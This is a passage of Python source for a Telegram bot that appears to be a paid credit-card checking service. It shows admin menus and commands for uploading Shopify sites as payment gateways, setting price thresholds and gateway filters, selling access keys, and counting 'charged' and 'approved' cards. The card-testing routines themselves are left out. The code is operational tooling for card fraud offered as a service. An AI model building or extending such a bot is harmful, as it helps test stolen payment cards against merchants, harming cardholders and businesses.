        [colored_button("📊 Bot Statistics", "admin_stats", "primary")],
        [colored_button("🔘 Bot Control", "admin_bot_control", "primary")],
        [colored_button("📢 Broadcast", "admin_broadcast_info", "primary")],
        [colored_button("↩️ Back", "back_start", "secondary")]
    ]
    await nav_edit(event.chat_id, event.message_id, text, kb)

# ---------- Sub‑menus ----------
@client.on(events.CallbackQuery(pattern=b"admin_premium"))
async def admin_premium_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    text = pe(
        f"<b>📋 Premium Management</b>\n"
        f"────────────────────\n"
        f"<code>/addpremium user_id limit</code>  → Add user with limit\n"
        f"<code>/removepremium user_id</code>  → Remove premium\n"
        f"<code>/listpremium</code>  → List all premium users & limits\n"
        f"<code>/genkeys amount hours user_limit [price]</code>  → Generate keys\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"admin_sites_management"))
async def admin_sites_management_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    text = pe(
        f"<b>🌐 Shopify Sites Management</b>\n"
        f"────────────────────\n"
        f"<code>/addsites</code>  → Reply to .txt file to upload sites\n"
        f"<code>/site</code>  → Check & remove dead sites\n"
        f"<code>/rm site</code>  → Remove a specific site\n"
        f"<code>/getsites</code>  → Download current sites.txt\n"
        f"<code>/setthreshold value</code>  → Set price threshold (e.g., 20)\n"
        f"<code>/getthreshold</code>  → Show current threshold\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"admin_filters"))
async def admin_filters_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    text = pe(
        f"<b>🔧 Price Filters</b>\n"
        f"────────────────────\n"
        f"<code>/setfilter gateway min-max \"Name\"</code>  → Add filter\n"
        f"  Example: <code>/setfilter shopify_global 10-50 \"Premium\"</code>\n"
        f"<code>/listfilters</code>  → View all filters\n"
        f"<code>/removefilter gateway number</code>  → Remove a filter by index\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"admin_videos"))
async def admin_videos_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    text = pe(
        f"<b>🎬 Video Management</b>\n"
        f"────────────────────\n"
        f"<code>/setwelcomevideo</code>  → Reply to a video\n"
        f"<code>/addhitvideo</code>  → Reply to a video to add to hit list\n"
        f"<code>/removehitvideo index</code>  → Remove by index\n"
        f"<code>/listhitvideos</code>  → List all hit videos\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await stats_cmd(event)

@client.on(events.CallbackQuery(pattern=b"admin_bot_control"))
async def admin_bot_control_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    text = pe(
        f"<b>🔘 Bot Control</b>\n"
        f"────────────────────\n"
        f"<code>/toggle</code>  → Enable/disable bot\n"
        f"<code>/ping</code>  → Check bot response time\n"
        f"<code>/addadmin user_id</code>  → Add admin\n"
        f"<code>/removeadmin user_id</code>  → Remove admin\n"
        f"<code>/adminadd user_id</code>  → (alias) Add admin\n"
        f"<code>/adminrm user_id</code>  → (alias) Remove admin\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def admin_broadcast_info_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    total = await get_total_users()
    text = pe(
        f"<b>📢 Broadcast</b>\n"
        f"────────────────────\n"
        f"📋 <b>Reach</b>  »  ~{total} users\n"
        f"────────────────────\n"
        f"<code>/all message</code>  → Send message to all users\n"
        f"<code>/fb</code>  → Forward replied media to all users\n"
    )
    kb = [[colored_button("↩️ Back", "admin_panel", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

# ====================== NAV_EDIT HELPER ======================
async def nav_edit(chat_id, message_id, text, kb_rows):
    try:
        msg = await client_instance.get_messages(chat_id, ids=message_id)
        if msg:
            await msg.edit(text, buttons=kb_rows, link_preview=False, parse_mode='html')
    except Exception as e:
        log_system("NAV_EDIT", f"Error: {e}", "error")

# ====================== USER COMMANDS ======================
# All existing user commands (sh, msh, rz, mrz, add, rm, sites, site, addpxy, proxy, rmpxy, chkpxy, info, plan, stop) remain unchanged.
# We'll include them below (shortened for brevity, but you should keep your existing implementations).

# Since this is a large file, we'll continue with the admin commands below.

# ====================== ADMIN COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpremium\s+(\d+)\s+(\d+)$'))
async def add_premium_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    user_id = int(event.pattern_match.group(1))
    limit = int(event.pattern_match.group(2))
    await ensure_user(user_id)
    await set_user_plan(user_id, "Premium", 30)
    await db["users"].update_one({"user_id": user_id}, {"$set": {"premium_limit": limit}}, upsert=True)
    await styled_reply(event, pe(f"✅ User <code>{user_id}</code> added as Premium with limit <code>{limit}</code>."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]removepremium\s+(\d+)$'))
async def remove_premium_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    user_id = int(event.pattern_match.group(1))
    await set_user_plan(user_id, "Bronze", 0)
    await db["users"].update_one({"user_id": user_id}, {"$unset": {"premium_limit": ""}})
    await styled_reply(event, pe(f"✅ Premium removed for <code>{user_id}</code>."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]listpremium$'))
async def list_premium_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    users = await get_all_premium_users()
    if not users:
        return await styled_reply(event, pe("📋 No premium users."), emoji_ids=[CE["warn"]])
    lines = [f"{i+1}. {u['user_id']} – limit: {u.get('premium_limit', 'N/A')}" for i, u in enumerate(users)]
    text = pe("📋 Premium Users & Limits\n────────────────────\n") + "\n".join(lines[:50])
    await styled_reply(event, text, emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkeys\s+(\d+)\s+(\d+)\s+(\d+)(?:\s+(.*))?$'))
async def gen_keys_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    amount = int(event.pattern_match.group(1))
    hours = int(event.pattern_match.group(2))
    user_limit = int(event.pattern_match.group(3))
    price = event.pattern_match.group(4) or "0"
    keys = []
    for _ in range(amount):
        key = await generate_key(1, hours, user_limit, price)
        keys.append(key)
    text = pe(f"✅ Generated {amount} keys (valid {hours}h, limit {user_limit})\n") + "\n".join(keys)
    await styled_reply(event, text, emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addsites$'))
async def addsites_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    await add_site(event)  # reuse existing add_site logic

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\s+(.+)$'))
async def rm_site_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    # reuse existing /rm logic
    await remove_site(event)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]getsites$'))
async def getsites_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    sites = await get_user_sites(event.sender_id)  # or all sites from DB
    if not sites:
        return await styled_reply(event, pe("🌐 No sites found."), emoji_ids=[CE["warn"]])
    fn = "sites.txt"
    async with aiofiles.open(fn, 'w') as f:
        for s in sites:
            await f.write(s + "\n")
    await event.reply(file=fn)
    os.remove(fn)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]setthreshold\s+(\d+)$'))
async def setthreshold_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    value = float(event.pattern_match.group(1))
    await set_threshold(value)
    await styled_reply(event, pe(f"✅ Threshold set to ${value}."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]getthreshold$'))
async def getthreshold_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    th = await get_threshold()
    await styled_reply(event, pe(f"📊 Current threshold: ${th}"), emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]setfilter\s+(\w+)\s+([\d.]+)-([\d.]+)\s+"([^"]+)"$'))
async def setfilter_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    gateway = event.pattern_match.group(1)
    min_p = float(event.pattern_match.group(2))
    max_p = float(event.pattern_match.group(3))
    name = event.pattern_match.group(4)
    await add_filter(gateway, min_p, max_p, name)
    await styled_reply(event, pe(f"✅ Filter added: {gateway} {min_p}-{max_p} \"{name}\""), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]listfilters$'))
async def listfilters_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    filters = await get_filters()
    if not filters:
        return await styled_reply(event, pe("🔧 No filters."), emoji_ids=[CE["warn"]])
    lines = [f"{i+1}. {f['gateway']}  {f['min']}-{f['max']}  {f['name']}" for i, f in enumerate(filters)]
    text = pe("🔧 Price Filters\n────────────────────\n") + "\n".join(lines)
    await styled_reply(event, text, emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]removefilter\s+(\w+)\s+(\d+)$'))
async def removefilter_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    gateway = event.pattern_match.group(1)
    index = int(event.pattern_match.group(2)) - 1
    ok = await remove_filter(gateway, index)
    if ok:
        await styled_reply(event, pe("✅ Filter removed."), emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, pe("❌ Filter not found."), emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]setwelcomevideo$'))
async def setwelcomevideo_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe("⚠️ Reply to a video."), emoji_ids=[CE["warn"]])
    reply = await event.get_reply_message()
    if reply.video or (reply.document and reply.document.mime_type.startswith('video/')):
        file_id = reply.video or reply.document
        await set_welcome_video(str(file_id.id))
        await styled_reply(event, pe("✅ Welcome video set."), emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, pe("⚠️ Reply must be a video."), emoji_ids=[CE["warn"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addhitvideo$'))
async def addhitvideo_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe("⚠️ Reply to a video."), emoji_ids=[CE["warn"]])
    reply = await event.get_reply_message()
    if reply.video or (reply.document and reply.document.mime_type.startswith('video/')):
        file_id = reply.video or reply.document
        await add_hit_video(str(file_id.id))
        await styled_reply(event, pe("✅ Hit video added."), emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, pe("⚠️ Reply must be a video."), emoji_ids=[CE["warn"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]removehitvideo\s+(\d+)$'))
async def removehitvideo_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    index = int(event.pattern_match.group(1)) - 1
    ok = await remove_hit_video(index)
    if ok:
        await styled_reply(event, pe("✅ Hit video removed."), emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, pe("❌ Video not found."), emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]listhitvideos$'))
async def listhitvideos_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    videos = await get_hit_videos()
    if not videos:
        return await styled_reply(event, pe("🎬 No hit videos."), emoji_ids=[CE["warn"]])
    lines = [f"{i+1}. {v['file_id']}" for i, v in enumerate(videos)]
    text = pe("🎬 Hit Videos\n────────────────────\n") + "\n".join(lines)
    await styled_reply(event, text, emoji_ids=[CE["chart"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]toggle$'))
async def toggle_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    current = await get_bot_toggle()
    await toggle_bot(not current)
    await styled_reply(event, pe(f"🔄 Bot {'enabled' if not current else 'disabled'}."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ping$'))
async def ping_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    start = time.time()
    msg = await event.reply("🏓 Pong!")
    elapsed = (time.time() - start) * 1000
    await msg.edit(pe(f"🏓 Pong!  {elapsed:.0f}ms"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.](addadmin|adminadd)\s+(\d+)$'))
async def addadmin_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    uid = int(event.pattern_match.group(2))
    await add_admin(uid)
    await styled_reply(event, pe(f"✅ Admin <code>{uid}</code> added."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.](removeadmin|adminrm)\s+(\d+)$'))
async def removeadmin_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    uid = int(event.pattern_match.group(2))
    await remove_admin(uid)
    await styled_reply(event, pe(f"✅ Admin <code>{uid}</code> removed."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]all\s+(.+)$'))
async def all_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    msg_text = event.pattern_match.group(1)
    all_users = await db["users"].distinct("user_id")
    sent = 0
    for uid in all_users:
        try:
            await styled_send(uid, f"📢 <b>Announcement</b>\n{msg_text}")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await styled_reply(event, pe(f"✅ Broadcast sent to {sent} users."), emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fb$'))
async def fb_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe("⚠️ Reply to a message with media."), emoji_ids=[CE["warn"]])
    reply = await event.get_reply_message()
    if not reply.media:
        return await styled_reply(event, pe("⚠️ No media found."), emoji_ids=[CE["warn"]])
    all_users = await db["users"].distinct("user_id")
    sent = 0
    for uid in all_users:
        try:
            await client_instance.forward_messages(uid, reply)
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await styled_reply(event, pe(f"✅ Forwarded to {sent} users."), emoji_ids=[CE["check"]])

# ====================== STATS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if not await is_admin_user(event.sender_id):
        return await styled_reply(event, "❌ Admin only.", emoji_ids=[CE["cross"]])
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts2 = await get_total_sites_count(); tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts2}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    log_system("BOOT", "Starting bot...")
    while True:
        try:
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
